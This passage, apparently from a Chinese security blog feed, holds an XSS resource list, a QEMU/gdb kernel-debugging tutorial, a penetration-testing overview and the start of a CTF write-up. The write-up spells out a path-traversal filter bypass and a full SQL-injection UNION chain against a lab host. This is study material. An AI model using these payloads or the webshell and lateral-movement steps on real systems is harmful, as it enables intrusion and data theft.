<code>JavaScript (&#39;unsafe-inline&#39;)</code> 时, 他们仍然可以为尚不支持 <a href="https://developer.mozilla.org/en-US/docs/Glossary/CSP" target="_blank" rel="noopener"><code>CSP</code></a> 的旧版浏览器的用户提供保护。</p><h1 id="Games"><a href="#Games" class="headerlink" title="Games"></a>Games</h1><ol><li><a href="https://alf.nu/alert1" target="_blank" rel="noopener">alert(1) to win</a> —&gt; <a href="https://github.com/masazumi-github/alert-1-to-win" target="_blank" rel="noopener">alert(1) to win payloads</a></li><li><a href="http://prompt.ml/0" target="_blank" rel="noopener">prompt(1) to win</a> —&gt; <a href="https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml" target="_blank" rel="noopener">XSSChallengeWiki - prompt.ml</a></li><li><a href="https://xss-game.appspot.com/" target="_blank" rel="noopener">XSS game area</a> —&gt; <a href="https://www.freebuf.com/articles/web/36072.html" target="_blank" rel="noopener">玩转 Google 的 XSS 游戏</a></li><li><a href="http://xss-quiz.int21h.jp/" target="_blank" rel="noopener">XSS Challenges</a> —&gt; <a href="https://github.com/matachi/MaTachi.github.io/blob/master/src/pages/solutions-to-the-wargame-xss-challenges-at-xss-quiz-int21h-jp.md" target="_blank" rel="noopener">Solutions to the wargame XSS Challenges</a></li></ol><h1 id="Advanced"><a href="#Advanced" class="headerlink" title="Advanced"></a>Advanced</h1><ul><li><a href="https://juejin.im/post/5bad9140e51d450e935c6d64" target="_blank" rel="noopener">如何防止 XSS 攻击</a></li><li><a href="https://blog.cm2.pw/length-restricted-xss/" target="_blank" rel="noopener">XSS with length restriction</a></li><li><a href="https://www.freebuf.com/articles/web/153055.html" target="_blank" rel="noopener">XSS 过滤绕过速查表</a></li><li><a href="http://blog.nsfocus.net/xss-advance/" target="_blank" rel="noopener">XSS 攻击进阶篇——那些年我们看不懂的 XSS</a></li><li><a href="https://www.freebuf.com/articles/web/61268.html" target="_blank" rel="noopener">XSS 攻击冷门花样玩法总结</a></li><li><a href="https://www.freebuf.com/articles/web/74324.html" target="_blank" rel="noopener">戏耍 XSS 的一些技巧</a></li><li><a href="https://wooyun.js.org/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html" target="_blank" rel="noopener">Bypass xss 过滤的测试方法</a></li></ul><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://juejin.im/post/5bcc9487518825780e6eaf12" target="_blank" rel="noopener">https://juejin.im/post/5bcc9487518825780e6eaf12</a><br><a href="https://www.fooying.com/the-art-of-xss-1-introduction/" target="_blank" rel="noopener">https://www.fooying.com/the-art-of-xss-1-introduction/</a><br><a href="http://blog.nsfocus.net/xss-start-finish/" target="_blank" rel="noopener">http://blog.nsfocus.net/xss-start-finish/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用QEMU+gdb对Linux Kernel进行调试</title>
    <link href="/2019/08/08/%E4%BD%BF%E7%94%A8QEMU-gdb%E5%AF%B9Linux-Kernel%E8%BF%9B%E8%A1%8C%E8%B0%83%E8%AF%95/"/>
    <url>/2019/08/08/%E4%BD%BF%E7%94%A8QEMU-gdb%E5%AF%B9Linux-Kernel%E8%BF%9B%E8%A1%8C%E8%B0%83%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<p>最近在分析一个 CVE 的时候涉及到对内核的调试，先提前研究一下。</p><a id="more"></a><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>OS：Ubuntu 16.04（VMware Fusion）</p><pre><code class="bash">➜  ~ uname -aLinux ubuntu 4.4.0-92-generic #115-Ubuntu SMP Thu Aug 10 09:04:33 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux➜  ~ lsb_release -aNo LSB modules are available.Distributor ID:    UbuntuDescription:    Ubuntu 16.04.6 LTSRelease:    16.04Codename:    xenial</code></pre><h1 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h1><h2 id="Dependence"><a href="#Dependence" class="headerlink" title="Dependence"></a>Dependence</h2><p>安装 QEMU：</p><pre><code class="bash">$ sudo apt install qemu qemu-system</code></pre><p>一些用于编译内核的依赖：</p><pre><code class="bash">$ sudo apt install libncurses5-dev build-essential kernel-package</code></pre><h2 id="Linux-Kernel"><a href="#Linux-Kernel" class="headerlink" title="Linux Kernel"></a>Linux Kernel</h2><p>Linux 内核源码肯定少不了，编译完后：</p><pre><code class="bash">$ wget https://mirrors.tuna.tsinghua.edu.cn/kernel/v4.x/linux-4.20.17.tar.gz$ tar -zxvf linux-4.20.17.tar.gz &amp;&amp; cd linux-4.20.17$ make menuconfig # 直接保存即可$ make bzImage</code></pre><p>在 <code>make menuconfig</code> 中配置：</p><ul><li><code>Kernel hacking</code><ul><li><code>Compile-time checks and compiler options</code><ul><li>选中 <code>Compile the kernel with debug info</code></li></ul></li><li>选中 <code>Compile the kernel with frame pointers</code></li><li>选中 <code>KGDB: kernel debugger</code></li></ul></li><li><code>Processor type and features</code><ul><li>取消 <code>Paravirtualized guest support</code></li></ul></li><li><code>KernelHacking</code><ul><li>取消 <code>Write protect kernel read-only data structures</code></li></ul></li></ul><p>过一段时间之后编译得到 <code>arch/x86/boot/bzImage</code>（被压缩后的内核文件）以及 <code>vmlinux</code>（带调试信息的内核文件）：</p><pre><code class="bash">...  OBJCOPY arch/x86/boot/setup.bin  OBJCOPY arch/x86/boot/vmlinux.bin  HOSTCC  arch/x86/boot/tools/build  BUILD   arch/x86/boot/bzImageSetup is 17148 bytes (padded to 17408 bytes).System is 8385 kBCRC 67bf4091Kernel: arch/x86/boot/bzImage is ready  (#1)</code></pre><h2 id="Busybox"><a href="#Busybox" class="headerlink" title="Busybox"></a>Busybox</h2><p>启动内核还需要一个简单的文件系统和一些命令，可以使用 Busybox 来构建</p><pre><code class="bash">$ wget https://busybox.net/downloads/busybox-1.31.0.tar.bz2$ tar -jxvf busybox-1.31.0.tar.bz2 &amp;&amp; cd busybox-1.31.0$ make menuconfig # Build static binary (no shared libs)$ make install</code></pre><p>在 <code>make menuconfig</code> 中配置：</p><ul><li><code>Settings</code><ul><li><code>Build Options</code><ul><li><code>Build static binary (no shared libs)</code>（编译成静态文件）</li></ul></li></ul></li><li><code>Linux System Utilities</code><ul><li>关闭 <code>Support mounting NFS file systems on Linux &lt; 2.6.23</code>（网络文件系统）</li></ul></li><li><code>Networking Utilities</code><ul><li>关闭 <code>inetd</code>（Internet 超级服务器）</li></ul></li></ul><p>接下来在 Busybox 目录下简单配置一下启动脚本：</p><pre><code>➜  _install mkdir proc sys dev etc etc/init.d➜  _install vim etc/init.d/rcS➜  _install chmod +x etc/init.d/rcS➜  _install cat etc/init.d/rcS#!/bin/shmount -t proc none /procmount -t sysfs none /sys/sbin/mdev -s</code></pre><p>然后创建文件系统：</p><pre><code>$ find . | cpio -o --format=newc &gt; ../rootfs.img</code></pre><p>接下来就可以启动系统了：</p><pre><code class="bash">$ qemu-system-x86_64 \    -kernel $KERNEL_SRC/arch/x86_64/boot/bzImage \    -initrd $BUSYBOX_SRC/rootfs.img \    -append &quot;console=ttyS0 root=/dev/ram rdinit=/sbin/init&quot; \    -cpu kvm64,+smep,+smap \    --nographic \    -gdb tcp::1234</code></pre><h1 id="Finally"><a href="#Finally" class="headerlink" title="Finally"></a>Finally</h1><p>接下来使用用 gdb 进行调试：</p><pre><code class="gdb">➜  ~ gdb -ex &quot;target remote localhost:1234&quot; $KERNEL_SRC/vmlinuxGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1Copyright (C) 2016 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;and &quot;show warranty&quot; for details.This GDB was configured as &quot;x86_64-linux-gnu&quot;.Type &quot;show configuration&quot; for configuration details.For bug reporting instructions, please see:&lt;http://www.gnu.org/software/gdb/bugs/&gt;.Find the GDB manual and other documentation resources online at:&lt;http://www.gnu.org/software/gdb/documentation/&gt;.For help, type &quot;help&quot;.Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...GEF for linux ready, type `gef&#39; to start, `gef config&#39; to configure80 commands loaded for GDB 7.11.1 using Python engine 3.5Remote debugging using localhost:1234native_safe_halt () at ./arch/x86/include/asm/irqflags.h:5050    }[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$rax   : 0x0000000000000000  →  0x0000000000000000$rbx   : 0xffffffff81d585c0  →  0x0000000000000001  →  0x0000000000000001$rcx   : 0x0000000000000000  →  0x0000000000000000$rdx   : 0x0000000000000000  →  0x0000000000000000$rsp   : 0xffffffff81bf7e98  →  &lt;init_thread_union+16024&gt; mov eax, 0xff81bf7e$rbp   : 0xffffffff81bf7e98  →  &lt;init_thread_union+16024&gt; mov eax, 0xff81bf7e$rsi   : 0x0000000000000000  →  0x0000000000000000$rdi   : 0x0000000000000000  →  0x0000000000000000$rip   : 0xffffffff810624f6  →  0x000000841f0fc35d  →  0x000000841f0fc35d$r8    : 0xffff88000760db60  →  0x0000000000000000  →  0x0000000000000000$r9    : 0x0000000000000000  →  0x0000000000000000$r10   : 0x0000000000000333  →  0x0000000000000333$r11   : 0xffff880006d8bde0  →  0x0000000000000400  →  0x0000000000000400$r12   : 0x0000000000000000  →  0x0000000000000000$r13   : 0x0000000000000000  →  0x0000000000000000$r14   : 0x0000000000000000  →  0x0000000000000000$r15   : 0xffffffff81bf4000  →  &lt;init_thread_union+0&gt; add BYTE PTR [rbp-0x40], dl$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0010 $ss: 0x0018 $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000───────────────────────────────────────────────────────────────────── stack ────[!] Unmapped address─────────────────────────────────────────────────────────────── code:x86:64 ────   0xffffffff810624f1 &lt;native_safe_halt+1&gt; mov    rbp, rsp   0xffffffff810624f4 &lt;native_safe_halt+4&gt; sti   0xffffffff810624f5 &lt;native_safe_halt+5&gt; hlt   0xffffffff810624f6 &lt;native_safe_halt+6&gt; pop    rbp   0xffffffff810624f7 &lt;native_safe_halt+7&gt; ret   0xffffffff810624f8                  nop    DWORD PTR [rax+rax*1+0x0]   0xffffffff81062500 &lt;native_halt+0&gt;  push   rbp   0xffffffff81062501 &lt;native_halt+1&gt;  mov    rbp, rsp   0xffffffff81062504 &lt;native_halt+4&gt;  hlt────────────────────────────────────────── source:./arch/x86/incl[...].h+50 ────     45     }     46     47     static inline void native_safe_halt(void)     48     {     49         asm volatile(&quot;sti; hlt&quot;: : :&quot;memory&quot;); →   50     }     51     52     static inline void native_halt(void)     53     {     54         asm volatile(&quot;hlt&quot;: : :&quot;memory&quot;);     55     }─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: &quot;&quot;, stopped, reason: SIGTRAP───────────────────────────────────────────────────────────────────── trace ────[#0] 0xffffffff810624f6 → native_safe_halt()[#1] 0xffffffff81020cee → arch_safe_halt()[#2] 0xffffffff81020cee → default_idle()[#3] 0xffffffff8102147f → arch_cpu_idle()[#4] 0xffffffff810c06fa → default_idle_call()[#5] 0xffffffff810c0a37 → cpuidle_idle_call()[#6] 0xffffffff810c0a37 → cpu_idle_loop()[#7] 0xffffffff810c0a37 → cpu_startup_entry(state=&lt;optimized out&gt;)[#8] 0xffffffff8181accc → rest_init()[#9] 0xffffffff81d7f023 → start_kernel()────────────────────────────────────────────────────────────────────────────────gef➤  b cmdline_proc_showBreakpoint 1 at 0xffffffff81276000: file fs/proc/cmdline.c, line 7.gef➤  cContinuing.</code></pre><p>在终端输入 <code>cat /proc/cmdline</code> 后会被断点断下来：</p><pre><code class="bash">/ # iduid=0 gid=0/ # whoamiwhoami: unknown uid 0/ # pwd// # cat /proc/cmdline</code></pre><p>可以跟着源码调试了：</p><pre><code class="gdb">...Breakpoint 1, cmdline_proc_show (m=0xffff880005f7c180, v=0x1 &lt;irq_stack_union+1&gt;) at fs/proc/cmdline.c:77    {[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$rax   : 0xffff880000047ee0  →   push rax$rbx   : 0x0000000000000000  →  0x0000000000000000$rcx   : 0x0000000000003014  →  0x0000000000003014$rdx   : 0x0000000000003013  →  0x0000000000003013$rsp   : 0xffff880005fc3868  →   mov esp, 0xff812245$rbp   : 0xffff880005fc38d0  →   lock cmp ah, bh$rsi   : 0x0000000000000001  →  0x0000000000000001$rdi   : 0xffff880005f7c180  →   add BYTE PTR [rax], al$rip   : 0xffffffff81276000  →  &lt;cmdline_proc_show+0&gt; nop DWORD PTR [rax+rax*1+0x0]$r8    : 0xffff880007619bc0  →   add BYTE PTR [rax-0xc], al$r9    : 0xffff880005f40000  →   add BYTE PTR [rax-0xc], al$r10   : 0x0000000000000001  →  0x0000000000000001$r11   : 0xffff880005fc4000  →  0x0000000000000000  →  0x0000000000000000$r12   : 0xffff880005fc3a88  →  0x0000000000000000  →  0x0000000000000000$r13   : 0xffff880005f7d000  →  0x0000000000000000  →  0x0000000000000000$r14   : 0xffff880005f7c180  →   add BYTE PTR [rax], al$r15   : 0x0000000000000001  →  0x0000000000000001$eflags: [CARRY parity adjust zero sign trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0010 $ss: 0x0018 $ds: 0x0000 $es: 0x0000 $fs: 0x0063 $gs: 0x0000───────────────────────────────────────────────────────────────────── stack ────[!] Unmapped address─────────────────────────────────────────────────────────────── code:x86:64 ────   0xffffffff81275ff7 &lt;cmdline_proc_open+23&gt; repnz  cli   0xffffffff81275ff9 &lt;cmdline_proc_open+25&gt; call   FWORD PTR [rbp-0x3d]   0xffffffff81275ffc                  nop    DWORD PTR [rax+0x0]   0xffffffff81276000 &lt;cmdline_proc_show+0&gt; nop    DWORD PTR [rax+rax*1+0x0]   0xffffffff81276005 &lt;cmdline_proc_show+5&gt; push   rbp   0xffffffff81276006 &lt;cmdline_proc_show+6&gt; mov    rdx, QWORD PTR [rip+0xcccffb]        # 0xffffffff81f43008 &lt;saved_command_line&gt;   0xffffffff8127600d &lt;cmdline_proc_show+13&gt; mov    rsi, 0xffffffff81b454d3   0xffffffff81276014 &lt;cmdline_proc_show+20&gt; mov    rbp, rsp   0xffffffff81276017 &lt;cmdline_proc_show+23&gt; call   0xffffffff81224970 &lt;seq_printf&gt;──────────────────────────────────────────────── source:fs/proc/cmdline.c+7 ────      2     #include &lt;linux/init.h&gt;      3     #include &lt;linux/proc_fs.h&gt;      4     #include &lt;linux/seq_file.h&gt;      5      6     static int cmdline_proc_show(struct seq_file *m, void *v) →    7     {      8         seq_printf(m, &quot;%s\n&quot;, saved_command_line);      9         return 0;     10     }     11     12     static int cmdline_proc_open(struct inode *inode, struct file *file)─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: &quot;&quot;, stopped, reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0xffffffff81276000 → cmdline_proc_show(m=0xffff880005f7c180, v=0x1 &lt;irq_stack_union+1&gt;)[#1] 0xffffffff812245bc → seq_read(file=0xffff880005f7d000, buf=&lt;optimized out&gt;, size=&lt;optimized out&gt;, ppos=0xffff880005fc3a88)[#2] 0xffffffff8126d4e2 → proc_reg_read(file=&lt;optimized out&gt;, buf=&lt;optimized out&gt;, count=&lt;optimized out&gt;, ppos=&lt;optimized out&gt;)[#3] 0xffffffff811fff55 → do_loop_readv_writev(filp=&lt;optimized out&gt;, iter=0xffff880005fc3958, ppos=0xffff880005fc3a88, fn=0xffffffff8126d4a0 &lt;proc_reg_read&gt;)[#4] 0xffffffff81200d52 → do_readv_writev(type=0x0, file=0xffff880005f7d000, uvector=&lt;optimized out&gt;, nr_segs=&lt;optimized out&gt;, pos=0xffff880005fc3a88)[#5] 0xffffffff81200da6 → vfs_readv(file=&lt;optimized out&gt;, vec=&lt;optimized out&gt;, vlen=&lt;optimized out&gt;, pos=&lt;optimized out&gt;)[#6] 0xffffffff8123283a → kernel_readv(offset=&lt;optimized out&gt;, vlen=&lt;optimized out&gt;, vec=&lt;optimized out&gt;, file=&lt;optimized out&gt;)[#7] 0xffffffff8123283a → default_file_splice_read(in=&lt;optimized out&gt;, ppos=&lt;optimized out&gt;, pipe=&lt;optimized out&gt;, len=0xff0000, flags=&lt;optimized out&gt;)[#8] 0xffffffff81231209 → do_splice_to(in=0xffff880005f7d000, ppos=0xffff880005fc3df0, pipe=0xffff880005f7c300, len=0x1000000, flags=0x0)[#9] 0xffffffff812312da → splice_direct_to_actor(in=&lt;optimized out&gt;, sd=0x1 &lt;irq_stack_union+1&gt;, actor=&lt;optimized out&gt;)────────────────────────────────────────────────────────────────────────────────...</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://xz.aliyun.com/t/2306" target="_blank" rel="noopener">https://xz.aliyun.com/t/2306</a><br><a href="http://pwn4.fun/2017/04/17/Linux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" target="_blank" rel="noopener">http://pwn4.fun/2017/04/17/Linux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</a><br><a href="https://veritas501.space/2018/06/03/kernel%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" target="_blank" rel="noopener">https://veritas501.space/2018/06/03/kernel%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</a><br><a href="https://n132.github.io/2019/07/14/2019-07-14-kernel-Outset/" target="_blank" rel="noopener">https://n132.github.io/2019/07/14/2019-07-14-kernel-Outset/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透测试基础指南</title>
    <link href="/2019/08/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80%E6%8C%87%E5%8D%97/"/>
    <url>/2019/08/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80%E6%8C%87%E5%8D%97/</url>
    
    <content type="html"><![CDATA[<p>记录一下渗透测试的基础步骤。</p><a id="more"></a><h1 id="Penetration-test"><a href="#Penetration-test" class="headerlink" title="Penetration test"></a>Penetration test</h1><p>渗透测试即利用我们所掌握的渗透知识，对网站进行一步一步的渗透，发现其中存在的漏洞和隐藏的风险，然后撰写一篇测试报告，提供给客户。客户根据我们撰写的测试报告，对网站进行漏洞修补，以防止黑客的入侵。</p><p>渗透测试的前提是经过用户的授权，才可以对网站进行渗透。如果我们没有经过客户的授权而对一个网站进行渗透测试的话是违法的。2016 年 6 月 1 日，我国颁布了<a href="https://baike.baidu.com/item/%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95" target="_blank" rel="noopener">《中华人民共和国网络安全法》</a>，对网络犯罪有了法律约束。</p><p>渗透测试分为白盒测试和黑盒测试：</p><ul><li>白盒测试：在知道目标网站源码和其他一些信息的情况下对其进行渗透，有点类似于代码审计</li><li>黑盒测试：只告诉我们这个网站的 url，其他什么都不告诉，模拟黑客对网站的渗透</li></ul><p>接下来记录一下黑盒测试的几个步骤</p><h2 id="Information-Gathering（信息收集）"><a href="#Information-Gathering（信息收集）" class="headerlink" title="Information Gathering（信息收集）"></a>Information Gathering（<a href="https://blog.csdn.net/qq_36119192/article/details/84027438" target="_blank" rel="noopener">信息收集</a>）</h2><ol><li>主动信息收集：通过直接访问、扫描网站，这种流量将流经网站</li><li>被动信息收集：利用第三方的服务对目标进行访问了解，比例：Google 搜索、Shodan 搜索等</li></ol><ul><li>DNS 域名信息的收集</li><li>整站分析<ul><li>服务器类型(Linux/Windows)</li><li>网站容器(Apache/Nginx/Tomcat/IIS)</li><li>脚本类型(php/jsp/asp/aspx)</li><li>数据库类型(Mysql/Oracle/Accees/Mqlserver)</li></ul></li><li>主机扫描(Nessus)</li><li>端口扫描(nmap)</li><li>网站敏感目录和文件</li><li>旁站和 C 段扫描</li><li>网站漏洞扫描</li></ul><h2 id="Vulnerability-Detection（漏洞探测）"><a href="#Vulnerability-Detection（漏洞探测）" class="headerlink" title="Vulnerability Detection（漏洞探测）"></a>Vulnerability Detection（漏洞探测）</h2><p>探测网站是否存在一些常见的 Web 漏洞：</p><ol><li>SQL 注入</li><li>XSS 跨站脚本</li><li>CSRF 跨站请求伪造</li><li>XXE 漏洞</li><li>SSRF 服务端请求伪造漏洞</li><li>文件包含漏洞</li><li>文件上传漏洞</li><li>文件解析漏洞</li><li>远程代码执行漏洞</li><li>CORS 跨域资源共享漏洞</li><li>越权访问漏洞</li><li>目录浏览漏洞和任意文件读取/下载漏洞</li><li>struts2 漏洞</li><li>JAVA 反序列化漏洞</li><li>…</li></ol><h2 id="Vulnerability-Exploitation（漏洞利用）"><a href="#Vulnerability-Exploitation（漏洞利用）" class="headerlink" title="Vulnerability Exploitation（漏洞利用）"></a>Vulnerability Exploitation（漏洞利用）</h2><p>当我们探测到了该网站存在漏洞之后，我们就要对该漏洞进行利用了。不同的漏洞有不同的利用工具，很多时候，通过一个漏洞我们很难拿到网站的 webshell，我们往往需要结合几个漏洞来拿 webshell。</p><ol><li>SQL 注入：<a href="https://blog.csdn.net/qq_36119192/article/details/84479207" target="_blank" rel="noopener">Sqlmap</a></li><li>XSS 跨站脚本：<a href="https://blog.csdn.net/qq_36119192/article/details/82731839" target="_blank" rel="noopener">BeEF</a></li><li>抓包改包工具：<a href="https://blog.csdn.net/qq_36119192/article/details/84310858" target="_blank" rel="noopener">Burpsuite</a>、<a href="https://blog.csdn.net/qq_36119192/article/details/82942574" target="_blank" rel="noopener">Fidder</a></li><li>文件上传漏洞：<a href="https://blog.csdn.net/qq_36119192/article/details/84563791" target="_blank" rel="noopener">上传一句话木马，进而获得 webshell</a></li><li>提权：获得了 webshell 后，一般权限很低，所以需要提权，可以选择反弹一个 MSF 类型的 shell 提权，也可以使用其他提权（<a href="https://blog.csdn.net/qq_36119192/article/details/84887874" target="_blank" rel="noopener">Windows 提权</a>、<a href="https://blog.csdn.net/qq_36119192/article/details/84872644" target="_blank" rel="noopener">Linux 下用 SUID 提权</a>）</li></ol><h2 id="Intranet-forwarding（内网转发）"><a href="#Intranet-forwarding（内网转发）" class="headerlink" title="Intranet forwarding（内网转发）"></a>Intranet forwarding（<a href="https://blog.csdn.net/qq_36119192/article/details/84568266" target="_blank" rel="noopener">内网转发</a>）</h2><p>当我们获取到了网站的 Webshell 之后，如果我们是想获取该主机的有关信息，我们可以将该主机的 webshell 换成 MSF 的 shell。直接生成一个木马，然后在菜刀中执行该木马，我们就能接收到一个 MSF 类型的 shell。</p><p>如果我们还想进一步的探测内网主机的信息的话，我们就需要进行内网转发。我们不能直接和内网的主机通信，所以就需要借助获取到的 webshell 网站的服务器和内网主机进行通信。</p><h2 id="Intranet-Penetration（内网渗透）"><a href="#Intranet-Penetration（内网渗透）" class="headerlink" title="Intranet Penetration（内网渗透）"></a>Intranet Penetration（<a href="https://www.freebuf.com/company-information/172630.html" target="_blank" rel="noopener">内网渗透</a>）</h2><p>当能跟内网主机进行通信后，就可以开始进行内网渗透。可以先使用 <a href="https://blog.csdn.net/qq_36119192/article/details/82079150" target="_blank" rel="noopener">nmap</a> 对内网主机进行扫描，探测在线的主机，并且探测其使用的操作系统、开放的端口等信息。</p><p>内网用户基本都是使用的 windows 系统，而且大多数是使用的 windows7，在 windows7 中有很多漏洞，比如 MS17_010 这种漏洞，我们可以使用 <a href="https://blog.csdn.net/qq_36119192/article/details/83215257" target="_blank" rel="noopener">Metasploit Framework</a> 探测其 windows 系统是否存在这种漏洞，如果有这种漏洞，直接拿 shell。</p><p>企业内网大多数是一个域环境，所以我们只需要找到域控服务器，并拿下其权限，就可以登录其他所有用户的主机。</p><p>当然，内网中也有可能存在供内网使用的内网服务器，我们可以进一步渗透拿下其权限。</p><h2 id="Report-Writing（撰写渗透测试报告）"><a href="#Report-Writing（撰写渗透测试报告）" class="headerlink" title="Report Writing（撰写渗透测试报告）"></a>Report Writing（撰写渗透测试报告）</h2><p>完成渗透测试之后，需要对这次渗透测试撰写渗透测试报告。明确地写出哪里存在漏洞，以及漏洞修补的方法，以便于网站管理员根据渗透测试报告修补这些漏洞和风险，防止被黑客攻击。</p><h1 id="Complement"><a href="#Complement" class="headerlink" title="Complement"></a>Complement</h1><h2 id="IP-配置"><a href="#IP-配置" class="headerlink" title="IP 配置"></a>IP 配置</h2><h3 id="直接在文件中配置"><a href="#直接在文件中配置" class="headerlink" title="直接在文件中配置"></a>直接在文件中配置</h3><pre><code class="bash">sudo vim /etc/network/interfaces# auto eth0 # 自动启用第一块网卡# ifconf eth0 inet static# address 192.168.1.2 # IP地址# netmask 255.255.255.0 # 子网掩码# gateway 192.168.1.1 # 网关</code></pre><h3 id="命令行配置"><a href="#命令行配置" class="headerlink" title="命令行配置"></a>命令行配置</h3><pre><code class="bash">sudo ifconfig ens33 192.168.10.163 netmask 255.255.255.0 # 设置IP和掩码sudo route add default gw 192.168.10.1 # 设置网关sudo echo &quot;nameserver 192.168.10.1&quot; &gt;&gt; /etc/resolv.conf # 设置DNSsudo /etc/init.d/networking restart # 重启服务</code></pre><h2 id="Common-Vulnerabilities"><a href="#Common-Vulnerabilities" class="headerlink" title="Common Vulnerabilities"></a>Common Vulnerabilities</h2><h3 id="输入输出验证不充分"><a href="#输入输出验证不充分" class="headerlink" title="输入输出验证不充分"></a>输入输出验证不充分</h3><ul><li>输入输出验证</li><li>SQL 注入</li><li>跨站脚本攻击（XSS）</li><li>跨站请求伪造（CSRF）</li><li>文件上传常见问题</li><li>文件下载漏洞</li></ul><h3 id="设计缺陷"><a href="#设计缺陷" class="headerlink" title="设计缺陷"></a>设计缺陷</h3><ul><li>非授权对象引用</li><li>纵向越权</li><li>找回密码漏洞</li></ul><h3 id="环境缺陷"><a href="#环境缺陷" class="headerlink" title="环境缺陷"></a>环境缺陷</h3><ul><li>解析漏洞<ul><li>IIS 5.x/6.0 解析漏洞</li><li>IIS 7.0/IIS 7.5/ Nginx &lt;8.03 畸形解析漏洞</li><li>Nginx &lt;8.03 空字节代码执行漏洞</li><li>Apache 解析漏洞</li><li>其他</li></ul></li></ul><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://blog.csdn.net/qq_36119192/article/details/84674109" target="_blank" rel="noopener">https://blog.csdn.net/qq_36119192/article/details/84674109</a><br><a href="https://blog.csdn.net/wsclinux/article/details/73177091" target="_blank" rel="noopener">https://blog.csdn.net/wsclinux/article/details/73177091</a><br><a href="http://blog.nsfocus.net/common-vulnerability-verify/" target="_blank" rel="noopener">http://blog.nsfocus.net/common-vulnerability-verify/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2019-ZJGSUCTF</title>
    <link href="/2019/05/12/2019-ZJGSUCTF/"/>
    <url>/2019/05/12/2019-ZJGSUCTF/</url>
    
    <content type="html"><![CDATA[<p>一晃一年过去了，今年的个人赛肝的有点累。</p><a id="more"></a><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="100-分的题目就不想名字了"><a href="#100-分的题目就不想名字了" class="headerlink" title="100 分的题目就不想名字了"></a>100 分的题目就不想名字了</h2><p>任意文件读取，<code>../</code> 被过滤了，要双写绕过：</p><pre><code>http://10.21.13.190:22222/index.php?dir=.....///.....///.....///flag/flag1.txt</code></pre><h2 id="我苦心锻炼了三年"><a href="#我苦心锻炼了三年" class="headerlink" title="我苦心锻炼了三年"></a>我苦心锻炼了三年</h2><p>sql 注入，过滤了 <code>and</code>、<code>or</code>（双写绕过）以及空格（<code>%a0</code>）：</p><pre><code>http://10.21.13.190:23579/youseesee.php?id=1%27%29anandd%271%27%3D%271%27%23http://10.21.13.190:23579/youseesee.php?id=1%27)%a0oorrder%a0by%a03%23http://10.21.13.190:23579/youseesee.php?id=7%27)%a0uniounionn%a0seleselectct%a01,1,database()%23http://10.21.13.190:23579/youseesee.php?id=7%27)%a0uniounionn%a0seleselectct%a01,1,group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=database()%23http://10.21.13.190:23579/youseesee.php?id=7%27)%a0uniounionn%a0seleselectct%a01,1,group_concat(column_name)%a0from%a0infoorrmation_schema.columns%a0where%a0table_schema=database()anandd%a0table_name=&#39;N0_Ga3E_N0_1ife&#39;%23http://10.21.13.190:23579/youseesee.php?id=7%27)%a0uniounionn%a0seleselectct%a01,1,group_concat(0ne9unch3an)%a0from%a0N0_Ga3E_N0_1ife%23</code></pre><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="Click"><a href="#Click" class="headerlink" title="Click"></a>Click</h2><p>VB 程序，要求点击十万次就能拿到 flag。VB 动态调起来基本都在 dll 里绕来绕去，直接用 ida。找到 <code>cmp edx, 186A0h</code> 的地方，用 <a href="https://github.com/keystone-engine/keypatch" target="_blank" rel="noopener">keypatch</a> 改成 <code>cmp edx, 